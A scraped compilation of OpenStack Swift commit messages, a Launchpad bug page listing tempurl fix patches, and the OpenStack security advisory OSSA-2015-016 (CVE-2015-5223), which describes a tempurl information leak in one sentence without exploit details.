commit 964869accce8836bd2587c4b07559fb05fe580b2
Author: Atsushi SAKAI <sakaia@jp.fujitsu.com>
Date: Fri Jul 24 17:09:48 2015 +0900
Fix six typos on swift documentation
mechanisim => mechanism
http://docs.openstack.org/developer/swift/cors.html
overridde => override
http://docs.openstack.org/developer/swift/deployment\_guide.html
extentsions => extensions
http://docs.openstack.org/developer/swift/development\_ondisk\_backends.html
reuqest => request
http://docs.openstack.org/developer/swift/logs.html
suport => support
http://docs.openstack.org/developer/swift/overview\_architecture.html
mininum => minimum
http://docs.openstack.org/developer/swift/overview\_erasure\_code.html
$ git diff | diffstat
cors.rst | 2 +-
deployment\_guide.rst | 2 +-
development\_ondisk\_backends.rst | 2 +-
logs.rst | 2 +-
overview\_architecture.rst | 2 +-
overview\_erasure\_code.rst | 2 +-
6 files changed, 6 insertions(+), 6 deletions(-)
Change-Id: I8e095f4c216b2cfae48dff1e17d387048349f73c
Closes-Bug: #1477877
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit 89f705e8aab144092d40a13fc4ef19ffef5f3eba
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Thu Jul 23 06:11:27 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I94cf347564cb33977f33b1e64259bcb39a8cf809
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit f563a423bf2534268c2e785094d58dbbe0ebd390
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Wed Jul 22 15:27:26 2015 -0400
Updated tox setup instructions on Development Guidelines
The instructions suggest updating the ownership of the swift.egg-info
directory may be required and provide a cmd to do so. Said cmd assumes user
'swift' exists, but tox will require the current user to have access to the
directory to perform updates, moreover user swift may not exist at all.
Change-Id: I63951970553c086ff4f1ac65a81559ba69166494
commit a65e9db8752793ec37b594dc9eca5066171825db
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Jul 22 10:43:17 2015 +0000
Removing commented out code in test/unit/account/test\_backend.py
Noticed this while reviewing another change. Looks like the test itself already
ensures correct functionality of the reclaim() method in AccountBroker without
the commented code, thus removing this stale code.
Change-Id: I6a26a7591adef9fd794ca68a4e9c493d1127f93c
commit 99d052772a9585e0befdfd292fd03aefde77180a
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 13 01:12:43 2015 -0700
Fix 499 client disconnected on COPY EC object
Currently, a COPY request for an EC object might go to fail as 499 Client
disconnected because of the difference between destination request content
length and actual transferred bytes.
That is because the conditional response status and content length for
an EC object range GET is handled at calling the response instance on
proxy server. Therefore the calling response instance (resp()) will change
the conditional status from 200 (HTTP\_OK) to 206 (PartialContent) and will
change the content length for the range GET.
In EC case, sometimes Swift needs whole stored contents to decode a segment.
It will make 200 HTTP OK response from object-server and proxy-server
will unfortunately set whole content length to the destination content
length and it makes the bug 1467677.
This patch introduces a new method "fix\_conditional\_response" for
swift.common.swob.Response that calling \_response\_iter() and cached the
iter in the Response instance. By calling it, Swift can set correct condtional
response any time after setting whole content\_length to the response
instance like EC case.
Change-Id: If85826243f955d2f03c6ad395215c73daab509b1
Closes-Bug: #1467677
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit 62ed4f81ef80440550633eaaaa962a4f9383c2d3
Author: Timur Alperovich <timur.alperovich@gmail.com>
Date: Tue Jul 14 16:56:44 2015 -0700
Add two functional tests for delimiter.
The first test verifies that a delimiter will trim entries beyond the
first matching instance of delimiter (after the given matching prefix,
if any) and squash duplicates. So, when setting the delimiter
to "-", given blobs "test", "test-foo" and "test-bar-baz", we expect
only "test" (no matching delim) and "test-" (trim all characters after
the first "-", and squash duplicates).
The second test verifies that when a prefix is provided, the delimiter
will trim entries beyond the first matching instance of the delimiter
\*after the given prefix\*. So "bar, "bazar" which both match the
prefix "ba" will be returned as "bar" (no delimiter after the matching
prefix) and "baza" (after matching the prefix the remainder after the
the \*next\* matching delimiter "a" is trimmed).
Change-Id: I49a2aa8722f83e87b7d211e5c26827e93963d92a
commit 2d6c5fe2afde382edb8f04c91fca1911601b61d9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 21 09:56:13 2015 -0700
Fix Associated Projects link on Getting Started
Change-Id: I50be656bc5868242489f97c96a1feaef171933e0
commit cd7b2db550e41412281da0256b468c90ebcf3e8b
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 19:23:00 2015 +0530
unit tests: Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not create undesired
warnings.
Change-Id: I0602ba39ef93263386644ee68088d5f65fcb4a71
commit c3cc98b2c918476f1b54924e0c54e4c746eba4ac
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 17:03:20 2015 -0700
Add comment about ResumingGetter.used\_source\_etag
This confused a couple developers and took about ten minutes to
unravel in IRC; let's leave a clue for the next person.
Change-Id: I356c8c7a44de23f02eaf68d23a39c9eb4c203ff1
commit 06326d74657a8796439988115002298e4a5f4630
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 20 21:41:58 2015 +0530
Metaclass Python 3.x Compatibility
use "six.add\_metaclass" instead of "\_\_metaclass\_\_"
Change-Id: I57390fec40afe3a965be3215db8f79b9cf862a70
commit 317fa1af49d72ecaf7a9a499d8cdf00a086b4c6f
Author: Azhagu Selvan SP <tamizhgeek@gmail.com>
Date: Sat Jul 18 14:37:16 2015 +0530
Minor change in development saio setup doc
Make the test-requirements install command uniform with the rest of the
setup commands in the page by using the $HOME, instead of hardcoding
the folder path.
Change-Id: I8da7a191a301601e27f894f8268238d77b150ede
commit 39621b8629c7f378fc197f6ab1ddc8e2e797d1fa
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 18 14:12:58 2015 +0530
Deprecated xreadlines() usage fixed
Change-Id: Iadf42c2f86f78c11259e21c88b4aef51db3441ad
commit dde34c4b442a27761f2e6eca46ed9ec47a110392
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 11 22:46:41 2015 +0530
Modify zip usage for python3 where necessary.
py2 zip() is eager but py3 zip() and six.moves.zip() are lazy,
changing ones that require eager evaluation.
Change-Id: Ic9f6bccd7f57772158581905794f8d23b05f4223
commit faff98efd47fd59e28b1adb3e7ad4bc3dc6dd781
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Jul 9 07:35:47 2015 +0530
Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I9d9ca5766a2773a7b4071e280f00361d16b85383
commit 8753e452b04b0af6d6b444184b628724e14fbbb1
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 18:01:37 2015 +0200
Replace StringIO with BytesIO for WSGI input
wsgi.input is a binary stream (bytes), not a text stream (unicode).
\* Replace StringIO with BytesIO for WSGI input
\* Replace StringIO('') with StringIO() and replace WsgiStringIO('') with
WsgiStringIO(): an empty string is already the default value
Change-Id: I09c9527be2265a6847189aeeb74a17261ddc781a
commit 6e70f3fa322da70c2a65fb919d200e52fc5add8a
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 17:27:47 2015 +0200
Get StringIO and cStringIO from six.moves
\* replace "from cStringIO import StringIO"
with "from six.moves import cStringIO as StringIO"
\* replace "from StringIO import StringIO"
with "from six import StringIO"
\* replace "import cStringIO" and "cStringIO.StringIO()"
with "from six import moves" and "moves.cStringIO()"
\* replace "import StringIO" and "StringIO.StringIO()"
with "import six" and "six.StringIO()"
This patch was generated by the stringio operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: Iacba77fec3045f96773d1090c0bd48613729a561
commit c366ecf5c85c2797582bf79f7faab1d75b99a70e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 13 00:07:13 2015 +0530
Fix a minor python issue related with string.split
Replacing string.split(value, ',') with value.split(','):
the string.split() function was removed in Python 3
Change-Id: I9ed241a894ac698da33df75a774a56ae2824fadf
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47
commit 39b6ef6e4fd515d81e688ef365d26d5e0499be7c
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jun 25 02:06:54 2015 +0800
Fix reconstructor stats mssage.
Calculate reconstruction job count and remaining time that
would be inappropriate for user. Use real partition count would
be suitable for user.
Change-Id: I6b025854baf4757dddf9d7fe7bc2cece58a49157
Closes-Bug: #1468298
commit bfbda38db999ccd881509c68f0319c3d3dae4274
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 7 15:13:20 2015 -0700
Add save command to ring-builder-analyzer
\* cleanup command => ring builder function mapping
\* cleanup ParseCommandError/ValueError message building
Change-Id: I4be2aa963ce4f43035f02371d8388abd7a76536c
commit c907107fe4eacb378a92799de915234bd72d5d7c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 7 22:46:37 2015 +0530
cPickle is deprecated in py3, replacing it from six.moves
cPickle is deprecated and should be replaced with six.moves
to provide py2 and py3 compatibility.
Change-Id: Ibad990708722360d188c641e61444d50a16a1e93
commit 86033ba4dcd7b86670306b6e66345ae464caca9d
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jun 30 18:56:23 2015 +0100
EC tests should use ECDiskFileManager
Some EC tests in proxy/test\_server.py use the replication
DiskFileManager to open diskfiles. That works because it
turns out that DiskFileManager is robust to the frag index
being stitched onto the end of the timestamp in filenames,
but it would be better to test using the ECDiskFileManager
for EC diskfiles.
Also, drive-by deletion of some duplicated lines.
Change-Id: Ie3adb607d8c34a469df7d0f6f542ed5ba9a2dac0
commit 7bdb8266d4b926526acdea22e8c9c634855eeecc
Author: Thiago da Silva <thiago@redhat.com>
Date: Wed Mar 25 13:19:36 2015 +0000
Select policy when running functional test
Add ability to select a storage policy when running
the functional tests by defining the environment variable
SWIFT\_TEST\_POLICY.
This patch was first introduced by Janie Richling in
feature/ec: https://review.openstack.org/#/c/166097
Co-Authored-By: Janie Richling <jrichli@us.ibm.com>
Co-Authored-By: Christian Schwede <christian.schwede@enovance.com>
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Change-Id: Id96354546088df137def0ae7fd434baf64ed0c51
Signed-off-by: Thiago da Silva <thiago@redhat.com>

| **tags**: | added: in-feature-hummingbird |
| --- | --- |

[See full activity log](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/swift/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/swift/%2Bbug/1449212/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386391/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386391 "Change patch details")
* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386423/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386423 "Change patch details")
* [container-tempurl-scoping.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4388691/%2Bfiles/container-tempurl-scoping.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4388691 "Change patch details")
* [tempurl-torgomatic-patch2.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4390909/%2Bfiles/tempurl-torgomatic-patch2.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4390909 "Change patch details")
* [Sam's patch with a fixed func test.](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4407820/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4407820 "Change patch details")
* [disable-get-container-tempurl-cross-container.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438741/%2Bfiles/disable-get-container-tempurl-cross-container.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438741 "Change patch details")
* [disable-get-container-tempurl-cross-container-2.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438746/%2Bfiles/disable-get-container-tempurl-cross-container-2.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438746 "Change patch details")
* [disable-get-container-tempurl-cross-container-3.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439609/%2Bfiles/disable-get-container-tempurl-cross-container-3.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439609 "Change patch details")
* [acoles-combined-tempurl-xlo-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439721/%2Bfiles/acoles-combined-tempurl-xlo-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439721 "Change patch details")
* [acoles-tempurl-dlo-functest-mod.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439888/%2Bfiles/acoles-tempurl-dlo-functest-mod.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439888 "Change patch details")
* [clays-56-with-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439955/%2Bfiles/clays-56-with-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439955 "Change patch details")
* [tempurl-torgomatic-patch3.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439989/%2Bfiles/tempurl-torgomatic-patch3.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439989 "Change patch details")
* [container-tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440490/%2Bfiles/container-tempurl.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440490 "Change patch details")
* [tempurl-torgomatic-patch4.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440773/%2Bfiles/tempurl-torgomatic-patch4.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440773 "Change patch details")
* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442299/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442299 "Change patch details")
* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442300/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442300 "Change patch details")
* [tempurl-torgomatic-patch6.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442310/%2Bfiles/tempurl-torgomatic-patch6.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442310 "Change patch details")
* [tempurl-torgomatic-patch7.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442462/%2Bfiles/tempurl-torgomatic-patch7.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442462 "Change patch details")
* [tempurl-acoles-patch8.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442888/%2Bfiles/tempurl-acoles-patch8.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442888 "Change patch details")
* [tempurl-acoles-patch9.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442926/%2Bfiles/tempurl-acoles-patch9.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442926 "Change patch details")
* [kilo-tempurl-bp-combined.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4446467/%2Bfiles/kilo-tempurl-bp-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4446467 "Change patch details")
* [combined dlo & container tempurl fixes for master (ef8f14f)](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4449743/%2Bfiles/master-tempurl-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4449743 "Change patch details")

* [Add patch](/swift/%2Bbug/1449212/%2Baddcomment?field.patch=on)

## Bug attachments

* [test\_patch.sh](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439846/%2Bfiles/test_patch.sh)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439846 "Change attachment details")

* [Add attachment](/swift/%2Bbug/1449212/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_6b99824e_20250126_062837.html ===




=== Content from security.openstack.org_9730b5c4_20250125_055211.html ===


Toggle navigation

 Search

* [Software](https://www.openstack.org/software/)
  + [Overview](https://www.openstack.org/software/)
  + [OpenStack Components](https://www.openstack.org/software/project-navigator/openstack-components)
  + [SDKs](https://www.openstack.org/software/project-navigator/sdks)
  + [Deployment Tools](https://www.openstack.org/software/project-navigator/deployment-tools)
  + [OpenStack Map](https://www.openstack.org/assets/software/projectmap/openstack-map.pdf)
  + [Sample Configs](https://www.openstack.org/software/sample-configs/)
* [Use Cases](https://www.openstack.org/use-cases/)
  + [Users in Production](https://www.openstack.org/use-cases/)
  + [Ironic Bare Metal](https://www.openstack.org/use-cases/bare-metal/)
  + [Edge Computing](https://www.openstack.org/use-cases/edge-computing/)
  + [Telecom & NFV](https://www.openstack.org/use-cases/telecoms-and-nfv/)
  + [Science and HPC](https://www.openstack.org/use-cases/science/)
  + [Containers](https://www.openstack.org/use-cases/containers/)
  + [Enterprise](https://www.openstack.org/use-cases/enterprise/)
  + [User Survey](https://www.openstack.org/surveys/landing)
* [Events](https://openinfra.dev/summit)
  + [OpenInfra Summit](https://openinfra.dev/summit)
  + [Project Teams Gathering](https://www.openstack.org/ptg/)
  + [OpenDev](https://www.openstack.org/events/opendev-2020/)
  + [Community Events](https://www.openstack.org/events/community-events/)
  + [OpenStack & OpenInfra Days](https://www.openstack.org/events/openstackdays)
  + [Summit Videos](https://www.openstack.org/videos/)
* [Community](https://www.openstack.org/community/)
  + [Welcome! Start Here](https://www.openstack.org/community/)
  + [OpenStack Technical Committee](https://www.openstack.org/community/tech-committee)
  + [Speakers Bureau](https://www.openstack.org/community/speakers/)
  + [OpenStack Wiki](http://wiki.openstack.org)
  + [Get Certified (COA)](https://www.openstack.org/coa/)
  + [Jobs](https://www.openstack.org/community/jobs/)
  + [Marketing Resources](https://www.openstack.org/marketing/)
  + [Community News](https://www.openstack.org/news/)
  + [Superuser Magazine](http://superuser.openstack.org)
  + [OpenInfra Foundation Supporting Organizations](https://www.openstack.org/community/supporting-organizations/)
  + [OpenInfra Foundation](https://openinfra.dev)
* [Marketplace](https://www.openstack.org/marketplace/)
  + [Training](https://www.openstack.org/marketplace/training/)
  + [Distros & Appliances](https://www.openstack.org/marketplace/distros/)
  + [Public Clouds](https://www.openstack.org/marketplace/public-clouds/)
  + [Hosted Private Clouds](https://www.openstack.org/marketplace/hosted-private-clouds/)
  + [Remotely Managed Private Clouds](https://www.openstack.org/marketplace/remotely-managed-private-clouds/)
  + [Consulting & Integrators](https://www.openstack.org/marketplace/consulting/)
  + [Drivers](https://www.openstack.org/marketplace/drivers/)
* [Blog](https://www.openstack.org/blog/)
* [Docs](http://docs.openstack.org/)
* [Join](https://openinfra.dev/join/)
  + [Sign up for Foundation Membership](https://openinfra.dev/join/)
  + [Sponsor the Foundation](https://openinfra.dev/join/)
  + [More about the Foundation](https://openinfra.dev)
* [Log In](https://www.openstack.org/Security/login/?BackURL=/home/)

# OSSA-2015-016: Information leak via Swift tempurls

# OSSA-2015-016: Information leak via Swift tempurls[Â¶](#ossa-2015-016-information-leak-via-swift-tempurls "Link to this heading")

Date:

August 26, 2015

CVE:

CVE-2015-5223

## Affects[Â¶](#affects "Link to this heading")

* Swift: versions through 2.3.0

## Description[Â¶](#description "Link to this heading")

Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setups are affected.

## Patches[Â¶](#patches "Link to this heading")

* <https://review.openstack.org/217253> (Juno)
* <https://review.openstack.org/217254> (Kilo)
* <https://review.openstack.org/217255> (Kilo)
* <https://review.openstack.org/217259> (Liberty)
* <https://review.openstack.org/217260> (Liberty)

## Credits[Â¶](#credits "Link to this heading")

* Richard Hawkins from Rackspace (CVE-2015-5223)
* Swift core reviewers from OpenStack (CVE-2015-5223)

## References[Â¶](#references "Link to this heading")

* <https://launchpad.net/bugs/1453948>
* <https://launchpad.net/bugs/1449212>
* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5223>

## Notes[Â¶](#notes "Link to this heading")

* This fix will be included in future 2014.2.4 (juno) and 2015.1.2
  (kilo) releases.

this page last updated: 2025-01-07 18:17:35

[![Creative Commons Attribution 3.0 License](../_static/images/docs/license.png)](https://creativecommons.org/licenses/by/3.0/)

Except where otherwise noted, this document is licensed under
[Creative Commons
Attribution 3.0 License](https://creativecommons.org/licenses/by/3.0/). See all [OpenStack Legal Documents](https://www.openstack.org/legal).

found an error? report a bug

OpenStack Documentation

* Guides
* [Install Guides](https://docs.openstack.org/index.html#install-guides)
* [User Guides](https://docs.openstack.org/index.html#user-guides)
* [Configuration Guides](https://docs.openstack.org/index.html#configuration-guides)
* [Operations and Administration Guides](https://docs.openstack.org/index.html#ops-and-admin-guides)
* [API Guides](https://docs.openstack.org/index.html#api-guides)
* [Contributor Guides](https://docs.openstack.org/index.html#contributor-guides)
* Languages
* [Deutsch (German)](https://docs.openstack.org/de/)
* [FranÃ§ais (French)](https://docs.openstack.org/fr/)
* [Bahasa Indonesia (Indonesian)](https://docs.openstack.org/id/)
* [Italiano (Italian)](https://docs.openstack.org/it/)
* [æ¥æ¬èª (Japanese)](https://docs.openstack.org/ja/)
* [íêµ­ì´ (Korean)](https://docs.openstack.org/ko_KR/)
* [PortuguÃªs (Portuguese)](https://docs.openstack.org/pt_BR/)
* [TÃ¼rkÃ§e (TÃ¼rkiye)](https://docs.openstack.org/tr_TR/)
* [ç®ä½ä¸­æ (Simplified Chinese)](https://docs.openstack.org/zh_CN/)

#### Contents

* OSSA-2015-016: Information leak via Swift tempurls
  + [Affects](#affects)
  + [Description](#description)
  + [Patches](#patches)
  + [Credits](#credits)
  + [References](#references)
  + [Notes](#notes)

### OpenStack

* [Projects](https://www.openstack.org/software/project-navigator/)
* [OpenStack Security](https://security.openstack.org/)
* [Blog](https://openstack.org/blog/)
* [News](https://openstack.org/news/)

### Community

* [User Groups](https://www.meetup.com/pro/openinfradev/)
* [Events](https://openstack.org/community/events/)
* [Jobs](https://openstack.org/community/jobs/)
* [Companies](https://openinfra.dev/members/)
* [Contribute](https://docs.openstack.org/contributors)

### Documentation

* [OpenStack Manuals](https://docs.openstack.org)
* [Getting Started](https://openstack.org/software/start/)
* [API Documentation](https://developer.openstack.org)
* [Wiki](https://wiki.openstack.org)

### Branding & Legal

* [Legal Docs](https://openinfra.dev/legal)
* [Logos & Guidelines](https://openstack.org/brand/)
* [Trademark Policy](https://openinfra.dev/legal/trademark-policy)
* [Privacy Policy](https://openinfra.dev/privacy-policy)
* [OpenInfra CLA](https://docs.openstack.org/contributors/common/setup-gerrit.html#individual-contributor-license-agreement)

### Stay In Touch

The OpenStack project is provided under the
[Apache 2.0 license](https://www.apache.org/licenses/LICENSE-2.0). Docs.openstack.org is powered by
[Rackspace Cloud Computing](https://rackspace.com).



=== Content from www.redhat.com_ad877dc3_20250126_062829.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
